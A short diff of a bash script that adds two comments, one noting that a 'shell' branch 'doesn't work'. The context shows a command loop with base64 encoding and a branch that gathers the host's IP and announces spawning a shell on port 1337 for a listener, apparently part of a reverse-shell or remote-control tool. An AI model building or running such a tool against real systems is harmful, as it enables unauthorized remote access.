@@ -1,4 +1,5 @@
 #!/bin/bash
+	    # write a fuddcntion 
 
 execute () {
 	encode=$(echo $1 | base64)
@@ -21,6 +22,7 @@ while true; do
     elif [ $command = "shell" ]
 	then
 	    # gather ip(for unix)
+	    # doesn't work
 	    addr=$(ip -o -4 -br a | grep "UP" | awk '{print $3}' | sed 's/.\{3\}$//')
 	    echo "spawing a shell on port 1337"
 	    echo "Make sure you are listening..."
